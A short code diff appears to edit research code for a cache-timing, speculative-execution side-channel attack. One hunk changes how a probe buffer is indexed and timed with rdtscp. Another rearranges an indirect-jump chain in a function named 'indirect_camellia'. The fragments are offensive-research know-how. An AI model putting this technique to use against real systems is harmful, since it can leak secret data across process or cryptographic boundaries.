@@ -234,7 +234,8 @@ void check_probes() {
 
     int i, mix_i;
     for (i=0; i<NUM_PROBES; i++) {
-        mix_i = ((i*167) + 13) & 255;
+        //mix_i = ((i*167) + 13) & 255;
+        mix_i = i;
         addr = &probe_buf[mix_i*cur_probe_space];
         t0 = _rdtscp(&junk);
         asm volatile( "movb (%%rbx), %%al\n"
@@ -347,15 +348,14 @@ void indirect_camellia(register uint64_t *jmp_ptr) {
     // Do something slow to stall the pipeline???
     // Call the first thing in the jump chain
     //call((void (*)(void))jump_addrs[0].from);
-    /*
     asm volatile ("add (%%rcx), %%rax\n"
             "jmpq *%%rax\n" :: "a"(jump_addrs[0].from), "c"(jmp_ptr):);
-            */
+            //*/
 
-    asm volatile ("jmpq *%%rax\n" :: "a"(jump_addrs[0].from):);
+    //asm volatile ("jmpq *%%rax\n" :: "a"(jump_addrs[0].from):);
 
 done_jumps:
-    asm volatile ("add (%%rcx), %%rax\n" :: "c"(jmp_ptr));
+    //asm volatile ("add (%%rcx), %%rax\n" :: "c"(jmp_ptr));
     (*fn_ptr)();
     //t0 = _rdtscp(&junk);
     //fn_ptr = *fn_ptr_ptr;
